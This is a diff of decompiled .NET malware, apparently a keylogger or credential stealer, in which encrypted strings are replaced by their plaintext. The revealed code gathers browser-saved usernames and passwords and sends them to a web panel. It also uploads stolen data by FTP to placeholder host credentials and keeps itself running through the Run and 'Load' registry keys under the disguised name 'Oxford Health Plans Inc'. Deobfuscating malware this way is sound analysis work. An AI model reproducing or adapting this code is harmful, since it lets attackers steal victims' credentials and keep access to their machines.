 				ProjectData.SetProjectError(projectError3);
-				File.AppendAllText(Path.GetTempPath() + O.I("2qbrW8tf2IZoaPGZlcaKWw=="), O.I("v4EpbnhZTubu6HTjEZ8Gdw==") + DateTime.Now.ToString(NQW_69) + ")]<br>" + ES_92 + "<br>");
+				File.AppendAllText(Path.GetTempPath() + "/log.tmp", "[SavedLog (" + DateTime.Now.ToString(NQW_69) + ")]<br>" + ES_92 + "<br>");
 				ES_92 = "";
 				ProjectData.ClearProjectError();
 			}
@@ -2825,7 +2874,20 @@ internal sealed class N
 		//IL_009b: Expected O, but got I4
 		try
 		{
-			CC(string.Format(O.I("3T4xI1CvPpe0ypzhkakJ0EBNR0ZuOgpka+Xt3s81PWkyFSR4fqU2jTmYyUfbxzWcHJMpBOmruC7UDvzylf7ARPahyaxxiqiaQKeuiRlggntFnlhPkJpmdosUIqq2culK+naW4A1zSN94YvYMG3n6zXShd+mQHa+GPmBhQn/tDNZefNBjQR9gS68mHxjnArp+sStk4jEIxdoaAa9A1VHcUT75Ki1tN4/dEaP2VDI3FG0TF+B/ZuoIqSWkjklStLGN"), O.I("tdbvUCxttbYV0EawQVXj9w=="), HX_68, DateTime.Now.ToString(NQW_69), LR_70, null, null, null, null, null, null, null, null, null, BU_72));
+			CC(string.Format(@"type={0}
+hwid={1}
+time={2}
+pcname={3}
+logdata={4}
+screen={5}
+ipadd={6}
+webcam_link={7}
+client={8}
+link={9}
+username={10}
+password={11}
+screen_link={12}
+site_username={13}", "update", HX_68, DateTime.Now.ToString(NQW_69), LR_70, null, null, null, null, null, null, null, null, null, BU_72));
 		}
 		catch (Exception projectError)
 		{
@@ -2841,7 +2903,20 @@ internal sealed class N
 		//IL_009b: Expected O, but got I4
 		try
 		{
-			CC(string.Format(O.I("3T4xI1CvPpe0ypzhkakJ0EBNR0ZuOgpka+Xt3s81PWkyFSR4fqU2jTmYyUfbxzWcHJMpBOmruC7UDvzylf7ARPahyaxxiqiaQKeuiRlggntFnlhPkJpmdosUIqq2culK+naW4A1zSN94YvYMG3n6zXShd+mQHa+GPmBhQn/tDNZefNBjQR9gS68mHxjnArp+sStk4jEIxdoaAa9A1VHcUT75Ki1tN4/dEaP2VDI3FG0TF+B/ZuoIqSWkjklStLGN"), O.I("tdbvUCxttbYV0EawQVXj9w=="), HX_68, DateTime.Now.ToString(NQW_69), LR_70, null, null, null, null, null, null, null, null, null, BU_72));
+			CC(string.Format(@"type={0}
+hwid={1}
+time={2}
+pcname={3}
+logdata={4}
+screen={5}
+ipadd={6}
+webcam_link={7}
+client={8}
+link={9}
+username={10}
+password={11}
+screen_link={12}
+site_username={13}", "update", HX_68, DateTime.Now.ToString(NQW_69), LR_70, null, null, null, null, null, null, null, null, null, BU_72));
 		}
 		catch (Exception projectError)
 		{
@@ -2858,7 +2933,20 @@ internal sealed class N
 		try
 		{
 			DateTime now = DateTime.Now;
-			CC(string.Format(O.I("3T4xI1CvPpe0ypzhkakJ0EBNR0ZuOgpka+Xt3s81PWkyFSR4fqU2jTmYyUfbxzWcHJMpBOmruC7UDvzylf7ARPahyaxxiqiaQKeuiRlggntFnlhPkJpmdosUIqq2culK+naW4A1zSN94YvYMG3n6zXShd+mQHa+GPmBhQn/tDNZefNBjQR9gS68mHxjnArp+sStk4jEIxdoaAa9A1VHcUT75Ki1tN4/dEaP2VDI3FG0TF+B/ZuoIqSWkjklStLGN"), O.I("OdF1EG4H2FuH64BzUwBAcg=="), HX_68, DateTime.Now.ToString(NQW_69), LR_70, null, null, null, null, null, null, null, null, null, BU_72));
+			CC(string.Format(@"type={0}
+hwid={1}
+time={2}
+pcname={3}
+logdata={4}
+screen={5}
+ipadd={6}
+webcam_link={7}
+client={8}
+link={9}
+username={10}
+password={11}
+screen_link={12}
+site_username={13}", "info", HX_68, DateTime.Now.ToString(NQW_69), LR_70, null, null, null, null, null, null, null, null, null, BU_72));
 		}
 		catch (Exception ex)
 		{
@@ -2875,12 +2963,25 @@ internal sealed class N
 		//IL_012f: Expected O, but got I4
 		try
 		{
-			string text = CC(string.Format(O.I("3T4xI1CvPpe0ypzhkakJ0EBNR0ZuOgpka+Xt3s81PWkyFSR4fqU2jTmYyUfbxzWcHJMpBOmruC7UDvzylf7ARPahyaxxiqiaQKeuiRlggntFnlhPkJpmdosUIqq2culK+naW4A1zSN94YvYMG3n6zXShd+mQHa+GPmBhQn/tDNZefNBjQR9gS68mHxjnArp+sStk4jEIxdoaAa9A1VHcUT75Ki1tN4/dEaP2VDI3FG0TF+B/ZuoIqSWkjklStLGN"), O.I("wal5VnjsAQ9zfeyA2jf+gw=="), HX_68, null, null, null, null, null, null, null, null, null, null, null, BU_72));
-			if (text.Contains(O.I("wal5VnjsAQ9zfeyA2jf+gw==")))
+			string text = CC(string.Format(@"type={0}
+hwid={1}
+time={2}
+pcname={3}
+logdata={4}
+screen={5}
+ipadd={6}
+webcam_link={7}
+client={8}
+link={9}
+username={10}
+password={11}
+screen_link={12}
+site_username={13}", "uninstall", HX_68, null, null, null, null, null, null, null, null, null, null, null, BU_72));
+			if (text.Contains("uninstall"))
 			{
 				try
 				{
-					Registry.CurrentUser.OpenSubKey(O.I("Akq+/Qobe3bW+jdjmv5oI6h1rNqdq+rlANdh6Ef29KelgAp0y6gsCspLDS+k+xmNC9TpnFhgwZyL///RhoSWxQ=="), true).DeleteValue(O.I("aZG83zDiQxysOvFJFc8qmg=="));
+					Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Windows", true).DeleteValue("Load");
 				}
 				catch (Exception projectError)
 				{
@@ -2889,7 +2990,7 @@ internal sealed class N
 				}
 				try
 				{
-					Registry.CurrentUser.OpenSubKey(O.I("Akq+/Qobe3bW+jdjmv5oI5U7Z9BdClsizpKUb3HtChUz3SNJfwOuCb74yondCL96"), true).DeleteValue(O.I("/Bm1qIrqMwm3w5qHc7UQXeAcGP2RzAQYxXJDJMYbvE4="));
+					Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true).DeleteValue("Oxford Health Plans Inc");
 				}
 				catch (Exception projectError2)
 				{
@@ -2931,12 +3032,25 @@ internal sealed class N
 		//IL_012f: Expected O, but got I4
 		try
 		{
-			string text = CC(string.Format(O.I("3T4xI1CvPpe0ypzhkakJ0EBNR0ZuOgpka+Xt3s81PWkyFSR4fqU2jTmYyUfbxzWcHJMpBOmruC7UDvzylf7ARPahyaxxiqiaQKeuiRlggntFnlhPkJpmdosUIqq2culK+naW4A1zSN94YvYMG3n6zXShd+mQHa+GPmBhQn/tDNZefNBjQR9gS68mHxjnArp+sStk4jEIxdoaAa9A1VHcUT75Ki1tN4/dEaP2VDI3FG0TF+B/ZuoIqSWkjklStLGN"), O.I("wal5VnjsAQ9zfeyA2jf+gw=="), HX_68, null, null, null, null, null, null, null, null, null, null, null, BU_72));
-			if (text.Contains(O.I("wal5VnjsAQ9zfeyA2jf+gw==")))
+			string text = CC(string.Format(@"type={0}
+hwid={1}
+time={2}
+pcname={3}
+logdata={4}
+screen={5}
+ipadd={6}
+webcam_link={7}
+client={8}
+link={9}
+username={10}
+password={11}
+screen_link={12}
+site_username={13}", "uninstall", HX_68, null, null, null, null, null, null, null, null, null, null, null, BU_72));
+			if (text.Contains("uninstall"))
 			{
 				try
 				{
-					Registry.CurrentUser.OpenSubKey(O.I("Akq+/Qobe3bW+jdjmv5oI6h1rNqdq+rlANdh6Ef29KelgAp0y6gsCspLDS+k+xmNC9TpnFhgwZyL///RhoSWxQ=="), true).DeleteValue(O.I("aZG83zDiQxysOvFJFc8qmg=="));
+					Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Windows", true).DeleteValue("Load");
 				}
 				catch (Exception projectError)
 				{
@@ -2945,7 +3059,7 @@ internal sealed class N
 				}
 				try
 				{
-					Registry.CurrentUser.OpenSubKey(O.I("Akq+/Qobe3bW+jdjmv5oI5U7Z9BdClsizpKUb3HtChUz3SNJfwOuCb74yondCL96"), true).DeleteValue(O.I("/Bm1qIrqMwm3w5qHc7UQXeAcGP2RzAQYxXJDJMYbvE4="));
+					Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true).DeleteValue("Oxford Health Plans Inc");
 				}
 				catch (Exception projectError2)
 				{
@@ -2987,13 +3101,13 @@ internal sealed class N
 		//IL_0174: Expected O, but got I4
 		try
 		{
-			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(O.I("YwDTrWXAV1F/PvXKBuarog==") + H__156);
-			ftpWebRequest.Credentials = new NetworkCredential(O.I("5nurkypTPRiEiXigUhmGkQ=="), O.I("gzsAFMgl4BIfpfKHdq7Uiw=="));
-			ftpWebRequest.Method = O.I("zLhRCHskrgfwCC7x8L9sQQ==");
+			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create("%ftphost%/" + H__156);
+			ftpWebRequest.Credentials = new NetworkCredential("%ftpuser%", "%ftppassword%");
+			ftpWebRequest.Method = "STOR";
 			object bytes = Encoding.UTF8.GetBytes(WZN_157);
-			ftpWebRequest.ContentLength = Conversions.ToLong(NewLateBinding.LateGet(bytes, null, O.I("3ufhCmF9/TPsbzyl95q0/g=="), new object[0], null, null, null));
+			ftpWebRequest.ContentLength = Conversions.ToLong(NewLateBinding.LateGet(bytes, null, "Length", new object[0], null, null, null));
 			object requestStream = ftpWebRequest.GetRequestStream();
-			string memberName = O.I("DTWHvaQIZQVc5pCkLjlxfg==");
+			string memberName = "Write";
 			object[] array = new object[3]
 			{
 				RuntimeHelpers.GetObjectValue(bytes),
@@ -3001,7 +3115,7 @@ internal sealed class N
 				null
 			};
 			object instance = bytes;
-			array[2] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(instance, null, O.I("3ufhCmF9/TPsbzyl95q0/g=="), new object[0], null, null, null));
+			array[2] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(instance, null, "Length", new object[0], null, null, null));
 			object[] array2 = array;
 			bool[] array3 = new bool[3]
 			{
@@ -3016,12 +3130,12 @@ internal sealed class N
 			}
 			if (array3[2])
 			{
-				NewLateBinding.LateSetComplex(instance, null, O.I("3ufhCmF9/TPsbzyl95q0/g=="), new object[1]
+				NewLateBinding.LateSetComplex(instance, null, "Length", new object[1]
 				{
 					RuntimeHelpers.GetObjectValue(array2[2])
 				}, null, null, true, false);
 			}
-			NewLateBinding.LateCall(requestStream, null, O.I("i3SskJCMJiEi/z3gGDIn6A=="), new object[0], null, null, null, true);
+			NewLateBinding.LateCall(requestStream, null, "Close", new object[0], null, null, null, true);
 		}
 		catch (Exception ex)
 		{
@@ -3038,9 +3152,9 @@ internal sealed class N
 		//IL_008b: Expected O, but got I4
 		try
 		{
-			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(O.I("YwDTrWXAV1F/PvXKBuarog==") + TGO_159);
-			ftpWebRequest.Credentials = new NetworkCredential(O.I("5nurkypTPRiEiXigUhmGkQ=="), O.I("gzsAFMgl4BIfpfKHdq7Uiw=="));
-			ftpWebRequest.Method = O.I("zLhRCHskrgfwCC7x8L9sQQ==");
+			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create("%ftphost%/" + TGO_159);
+			ftpWebRequest.Credentials = new NetworkCredential("%ftpuser%", "%ftppassword%");
+			ftpWebRequest.Method = "STOR";
 			byte[] array = File.ReadAllBytes(J_T_158);
 			Stream requestStream = ftpWebRequest.GetRequestStream();
 			requestStream.Write(array, 0, array.Length);
@@ -3061,14 +3175,24 @@ internal sealed class N
 		//IL_3f11: Expected O, but got I4
 		//IL_3f12: Expected O, but got I4
 		DateTime now = DateTime.Now;
-		string format = O.I("+KvItdCkbJYVhD5M+8OWWuNMaKVwLuIiBwNvfWU5drw=");
+		string format = "MM/dd/yyyy HH:mm:ss";
 		StringBuilder stringBuilder = new StringBuilder();
 		StringBuilder stringBuilder2 = new StringBuilder();
-		stringBuilder2.Append(string.Format(O.I("3T4xI1CvPpe0ypzhkakJ0EBNR0ZuOgpka+Xt3s81PWkyFSR4fqU2jTmYyUfbxzWcHJMpBOmruC7UDvzylf7ARPahyaxxiqiaQKeuiRlggntUwOuJhdEkvGPuYYdltuNRG+c6D/iwXe+gm+5f4psFF1F73Gw/mzF37oCsXuUTe8nBRS+7D6UkKE9dhE7/noqB"), O.I("Zqe1ddpM2Flw4NHWRh0R1A=="), HX_68, DateTime.Now.ToString(NQW_69), LR_70, null, null, null, null, null, BU_72));
+		stringBuilder2.Append(string.Format(@"type={0}
+hwid={1}
+time={2}
+pcname={3}
+logdata={4}
+screen={5}
+ipadd={6}
+webcam_link={7}
+screen_link={8}
+site_username={9}
+[passwords]", "passwords", HX_68, DateTime.Now.ToString(NQW_69), LR_70, null, null, null, null, null, BU_72));
 		try
 		{
 			object obj = AEM.JHE();
-			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj, null, O.I("1rFXNQd9jNhZ7HixzgoKJA=="), new object[0], null, null, null), 0, false))
+			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj, null, "Count", new object[0], null, null, null), 0, false))
 			{
 				IEnumerator enumerator = default(IEnumerator);
 				try
@@ -3085,7 +3209,11 @@ internal sealed class N
 						{
 							if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
 							{
-								stringBuilder2.Append(string.Format(O.I("FXiNY3K+jDPAu07jcUM1KRxno/g6DZyUVUmsjKIACuaeSJHX7a+Q8Z2UQfXbYql/lXzRxbKC0QwbBRcEmi13CA=="), browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
+								stringBuilder2.Append(string.Format(@"
+client[]={0}
+link[]={1}
+username[]={2}
+password[]={3}", browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
 							}
 							else if ((Operators.CompareString(WEL_46, "smtp", false) == 0) | (Operators.CompareString(WEL_46, "ftp", false) == 0))
 							{
@@ -3116,7 +3244,7 @@ internal sealed class N
 		try
 		{
 			object obj2 = AEM.XF();
-			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj2, null, O.I("1rFXNQd9jNhZ7HixzgoKJA=="), new object[0], null, null, null), 0, false))
+			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj2, null, "Count", new object[0], null, null, null), 0, false))
 			{
 				IEnumerator enumerator2 = default(IEnumerator);
 				try
@@ -3133,7 +3261,11 @@ internal sealed class N
 						{
 							if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
 							{
-								stringBuilder2.Append(string.Format(O.I("FXiNY3K+jDPAu07jcUM1KRxno/g6DZyUVUmsjKIACuaeSJHX7a+Q8Z2UQfXbYql/lXzRxbKC0QwbBRcEmi13CA=="), browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
+								stringBuilder2.Append(string.Format(@"
+client[]={0}
+link[]={1}
+username[]={2}
+password[]={3}", browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
 							}
 							else if ((Operators.CompareString(WEL_46, "smtp", false) == 0) | (Operators.CompareString(WEL_46, "ftp", false) == 0))
 							{
@@ -3164,7 +3296,7 @@ internal sealed class N
 		try
 		{
 			object obj3 = AEM.NJG();
-			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj3, null, O.I("1rFXNQd9jNhZ7HixzgoKJA=="), new object[0], null, null, null), 0, false))
+			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj3, null, "Count", new object[0], null, null, null), 0, false))
 			{
 				IEnumerator enumerator3 = default(IEnumerator);
 				try
@@ -3181,7 +3313,11 @@ internal sealed class N
 						{
 							if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
 							{
-								stringBuilder2.Append(string.Format(O.I("FXiNY3K+jDPAu07jcUM1KRxno/g6DZyUVUmsjKIACuaeSJHX7a+Q8Z2UQfXbYql/lXzRxbKC0QwbBRcEmi13CA=="), browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
+								stringBuilder2.Append(string.Format(@"
+client[]={0}
+link[]={1}
+username[]={2}
+password[]={3}", browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
 							}
 							else if ((Operators.CompareString(WEL_46, "smtp", false) == 0) | (Operators.CompareString(WEL_46, "ftp", false) == 0))
 							{
@@ -3212,7 +3348,7 @@ internal sealed class N
 		try
 		{
 			object obj4 = AEM.BIH();
-			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj4, null, O.I("1rFXNQd9jNhZ7HixzgoKJA=="), new object[0], null, null, null), 0, false))
+			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj4, null, "Count", new object[0], null, null, null), 0, false))
 			{
 				IEnumerator enumerator4 = default(IEnumerator);
 				try
@@ -3229,7 +3365,11 @@ internal sealed class N
 						{
 							if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
 							{
-								stringBuilder2.Append(string.Format(O.I("FXiNY3K+jDPAu07jcUM1KRxno/g6DZyUVUmsjKIACuaeSJHX7a+Q8Z2UQfXbYql/lXzRxbKC0QwbBRcEmi13CA=="), browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
+								stringBuilder2.Append(string.Format(@"
+client[]={0}
+link[]={1}
+username[]={2}
+password[]={3}", browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
 							}
 							else if ((Operators.CompareString(WEL_46, "smtp", false) == 0) | (Operators.CompareString(WEL_46, "ftp", false) == 0))
 							{
@@ -3272,7 +3412,11 @@ internal sealed class N
 					{
 						if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
 						{
-							stringBuilder2.Append(string.Format(O.I("FXiNY3K+jDPAu07jcUM1KRxno/g6DZyUVUmsjKIACuaeSJHX7a+Q8Z2UQfXbYql/lXzRxbKC0QwbBRcEmi13CA=="), browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
+							stringBuilder2.Append(string.Format(@"
+client[]={0}
+link[]={1}
+username[]={2}
+password[]={3}", browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
 						}
 						else if ((Operators.CompareString(WEL_46, "smtp", false) == 0) | (Operators.CompareString(WEL_46, "ftp", false) == 0))
 						{
@@ -3295,7 +3439,7 @@ internal sealed class N
 		try
 		{
 			object obj5 = AEM.QHE();
-			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj5, null, O.I("1rFXNQd9jNhZ7HixzgoKJA=="), new object[0], null, null, null), 0, false))
+			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj5, null, "Count", new object[0], null, null, null), 0, false))
 			{
 				IEnumerator enumerator6 = default(IEnumerator);
 				try
@@ -3312,7 +3456,11 @@ internal sealed class N
 						{
 							if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
 							{
-								stringBuilder2.Append(string.Format(O.I("FXiNY3K+jDPAu07jcUM1KRxno/g6DZyUVUmsjKIACuaeSJHX7a+Q8Z2UQfXbYql/lXzRxbKC0QwbBRcEmi13CA=="), browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
+								stringBuilder2.Append(string.Format(@"
+client[]={0}
+link[]={1}
+username[]={2}
+password[]={3}", browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
 							}
 							else if ((Operators.CompareString(WEL_46, "smtp", false) == 0) | (Operators.CompareString(WEL_46, "ftp", false) == 0))
 							{
@@ -3343,7 +3491,7 @@ internal sealed class N
 		try
 		{
 			object obj6 = AEM.HAF();
-			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj6, null, O.I("1rFXNQd9jNhZ7HixzgoKJA=="), new object[0], null, null, null), 0, false))
+			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj6, null, "Count", new object[0], null, null, null), 0, false))
 			{
 				IEnumerator enumerator7 = default(IEnumerator);
 				try
@@ -3360,7 +3508,11 @@ internal sealed class N
 						{
 							if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
 							{
-								stringBuilder2.Append(string.Format(O.I("FXiNY3K+jDPAu07jcUM1KRxno/g6DZyUVUmsjKIACuaeSJHX7a+Q8Z2UQfXbYql/lXzRxbKC0QwbBRcEmi13CA=="), browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
+								stringBuilder2.Append(string.Format(@"
+client[]={0}
+link[]={1}
+username[]={2}
+password[]={3}", browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
 							}
 							else if ((Operators.CompareString(WEL_46, "smtp", false) == 0) | (Operators.CompareString(WEL_46, "ftp", false) == 0))
 							{
@@ -3391,7 +3543,7 @@ internal sealed class N
 		try
 		{
 			object obj7 = AEM.LA();
-			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj7, null, O.I("1rFXNQd9jNhZ7HixzgoKJA=="), new object[0], null, null, null), 0, false))
+			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj7, null, "Count", new object[0], null, null, null), 0, false))
 			{
 				IEnumerator enumerator8 = default(IEnumerator);
 				try
@@ -3408,7 +3560,11 @@ internal sealed class N
 						{
 							if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
 							{
-								stringBuilder2.Append(string.Format(O.I("FXiNY3K+jDPAu07jcUM1KRxno/g6DZyUVUmsjKIACuaeSJHX7a+Q8Z2UQfXbYql/lXzRxbKC0QwbBRcEmi13CA=="), browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
+								stringBuilder2.Append(string.Format(@"
+client[]={0}
+link[]={1}
+username[]={2}
+password[]={3}", browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
 							}
 							else if ((Operators.CompareString(WEL_46, "smtp", false) == 0) | (Operators.CompareString(WEL_46, "ftp", false) == 0))
 							{
@@ -3439,7 +3595,7 @@ internal sealed class N
 		try
 		{
 			object obj8 = AEM.PQL();
-			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj8, null, O.I("1rFXNQd9jNhZ7HixzgoKJA=="), new object[0], null, null, null), 0, false))
+			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj8, null, "Count", new object[0], null, null, null), 0, false))
 			{
 				IEnumerator enumerator9 = default(IEnumerator);
 				try
@@ -3450,13 +3606,18 @@ internal sealed class N
 						JK jK8 = (JK)enumerator9.Current;
 						string browser = jK8.NP_115;
 						string uRL = jK8.WE_114;
-						string userName = jK8.ECS_112.Replace(O.I("Xm3hrwj60HWjb71M1bS+Pw=="), "");
+						string userName = jK8.ECS_112.Replace(@"
+", "");
 						string password = jK8.GA_113;
 						if (((uRL.Length > 1) | (browser.Length > 1)) & (userName.Length > 1) & (password.Length > 1))
 						{
 							if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
 							{
-								stringBuilder2.Append(string.Format(O.I("FXiNY3K+jDPAu07jcUM1KRxno/g6DZyUVUmsjKIACuaeSJHX7a+Q8Z2UQfXbYql/lXzRxbKC0QwbBRcEmi13CA=="), browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
+								stringBuilder2.Append(string.Format(@"
+client[]={0}
+link[]={1}
+username[]={2}
+password[]={3}", browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
 							}
 							else if ((Operators.CompareString(WEL_46, "smtp", false) == 0) | (Operators.CompareString(WEL_46, "ftp", false) == 0))
 							{
@@ -3487,7 +3648,7 @@ internal sealed class N
 		try
 		{
 			object obj9 = AEM.HYM();
-			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj9, null, O.I("1rFXNQd9jNhZ7HixzgoKJA=="), new object[0], null, null, null), 0, false))
+			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj9, null, "Count", new object[0], null, null, null), 0, false))
 			{
 				IEnumerator enumerator10 = default(IEnumerator);
 				try
@@ -3504,7 +3665,11 @@ internal sealed class N
 						{
 							if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
 							{
-								stringBuilder2.Append(string.Format(O.I("FXiNY3K+jDPAu07jcUM1KRxno/g6DZyUVUmsjKIACuaeSJHX7a+Q8Z2UQfXbYql/lXzRxbKC0QwbBRcEmi13CA=="), browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
+								stringBuilder2.Append(string.Format(@"
+client[]={0}
+link[]={1}
+username[]={2}
+password[]={3}", browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
 							}
 							else if ((Operators.CompareString(WEL_46, "smtp", false) == 0) | (Operators.CompareString(WEL_46, "ftp", false) == 0))
 							{
@@ -3535,7 +3700,7 @@ internal sealed class N
 		try
 		{
 			object obj10 = AEM.EMB();
-			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj10, null, O.I("1rFXNQd9jNhZ7HixzgoKJA=="), new object[0], null, null, null), 0, false))
+			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj10, null, "Count", new object[0], null, null, null), 0, false))
 			{
 				IEnumerator enumerator11 = default(IEnumerator);
 				try
@@ -3552,7 +3717,11 @@ internal sealed class N
 						{
 							if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
 							{
-								stringBuilder2.Append(string.Format(O.I("FXiNY3K+jDPAu07jcUM1KRxno/g6DZyUVUmsjKIACuaeSJHX7a+Q8Z2UQfXbYql/lXzRxbKC0QwbBRcEmi13CA=="), browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
+								stringBuilder2.Append(string.Format(@"
+client[]={0}
+link[]={1}
+username[]={2}
+password[]={3}", browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
 							}
 							else if ((Operators.CompareString(WEL_46, "smtp", false) == 0) | (Operators.CompareString(WEL_46, "ftp", false) == 0))
 							{
@@ -3583,7 +3752,7 @@ internal sealed class N
 		try
 		{
 			object obj11 = AEM.RD();
-			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj11, null, O.I("1rFXNQd9jNhZ7HixzgoKJA=="), new object[0], null, null, null), 0, false))
+			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj11, null, "Count", new object[0], null, null, null), 0, false))
 			{
 				IEnumerator enumerator12 = default(IEnumerator);
 				try
@@ -3600,7 +3769,11 @@ internal sealed class N
 						{
 							if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
 							{
-								stringBuilder2.Append(string.Format(O.I("FXiNY3K+jDPAu07jcUM1KRxno/g6DZyUVUmsjKIACuaeSJHX7a+Q8Z2UQfXbYql/lXzRxbKC0QwbBRcEmi13CA=="), browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
+								stringBuilder2.Append(string.Format(@"
+client[]={0}
+link[]={1}
+username[]={2}
+password[]={3}", browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
 							}
 							else if ((Operators.CompareString(WEL_46, "smtp", false) == 0) | (Operators.CompareString(WEL_46, "ftp", false) == 0))
 							{
@@ -3631,7 +3804,7 @@ internal sealed class N
 		try
 		{
 			object obj12 = AEM.FV();
-			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj12, null, O.I("1rFXNQd9jNhZ7HixzgoKJA=="), new object[0], null, null, null), 0, false))
+			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj12, null, "Count", new object[0], null, null, null), 0, false))
 			{
 				IEnumerator enumerator13 = default(IEnumerator);
 				try
@@ -3648,7 +3821,11 @@ internal sealed class N
 						{
 							if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
 							{
-								stringBuilder2.Append(string.Format(O.I("FXiNY3K+jDPAu07jcUM1KRxno/g6DZyUVUmsjKIACuaeSJHX7a+Q8Z2UQfXbYql/lXzRxbKC0QwbBRcEmi13CA=="), browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
+								stringBuilder2.Append(string.Format(@"
+client[]={0}
+link[]={1}
+username[]={2}
+password[]={3}", browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
 							}
 							else if ((Operators.CompareString(WEL_46, "smtp", false) == 0) | (Operators.CompareString(WEL_46, "ftp", false) == 0))
 							{
@@ -3692,7 +3869,11 @@ internal sealed class N
 					{
 						if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
 						{
-							stringBuilder2.Append(string.Format(O.I("FXiNY3K+jDPAu07jcUM1KRxno/g6DZyUVUmsjKIACuaeSJHX7a+Q8Z2UQfXbYql/lXzRxbKC0QwbBRcEmi13CA=="), browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
+							stringBuilder2.Append(string.Format(@"
+client[]={0}
+link[]={1}
+username[]={2}
+password[]={3}", browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
 						}
 						else if ((Operators.CompareString(WEL_46, "smtp", false) == 0) | (Operators.CompareString(WEL_46, "ftp", false) == 0))
 						{
@@ -3715,7 +3896,7 @@ internal sealed class N
 		try
 		{
 			object obj13 = AEM.FU();
-			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj13, null, O.I("1rFXNQd9jNhZ7HixzgoKJA=="), new object[0], null, null, null), 0, false))
+			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj13, null, "Count", new object[0], null, null, null), 0, false))
 			{
 				IEnumerator enumerator15 = default(IEnumerator);
 				try
@@ -3732,7 +3913,11 @@ internal sealed class N
 						{
 							if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
 							{
